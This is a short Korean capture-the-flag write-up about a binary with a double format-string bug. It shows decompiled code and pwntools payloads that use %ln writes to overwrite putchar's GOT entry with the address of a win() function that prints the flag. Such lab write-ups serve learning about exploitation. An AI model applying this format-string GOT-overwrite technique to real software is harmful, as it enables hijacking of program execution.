## 함수 분석 / 취약점 발견
### IDA decmopile analysis
1. 목표로 하는 함수는 다음과 같다. 어딘가의 ret 주소, got 주소를 변환해 일로 오게 하고 싶다. local에서 익스할때 flag 파일을 만들어 실험했다.
```c++
int win()
{
  return system("cat flag");
}
```
2. name과 desc에 입력을 받고 이를 두번 printf하는데, 딱봐도 double FSB 각이 나온다.
```c++
  maxlen -= readline(name, 128);
  desc = (char *)malloc(0x20uLL);
  printf("Desc: ");
  readline(desc, 32);
  ...
      case 3:
        printf(name);
        printf(desc);
        putchar(10);
```
3. putchar의 got가 존재한다.
* double FSB를 하고 3을 입력해 putchar의 got에 win의 주소를 넘겨주자.

## 구현
1. name에서 스택의 특정 부분에 putchar의 got 삽입
```python
putchar_got_addr = 0x602020
win_addr = 0x40094c

payload = b'%' + str(putchar_got_addr).encode() + b'x%11$ln' + b'a'*40
p.sendlineafter('Name: ', payload)
```

2. desc에서 putchar의 got에 win의 주소 삽입
```python
payload = b'%' + str(win_addr).encode() + b'x%37$ln '
p.sendlineafter('Desc: ', payload)

p.sendafter('> ', '3')

p.interactive()
```
* remote익스의 환경과 local 익스의 환경이 달라 애먹었다.
    * OS의 초기 루틴이 달라 stack에 있는 쓰레기값들이 달라진다.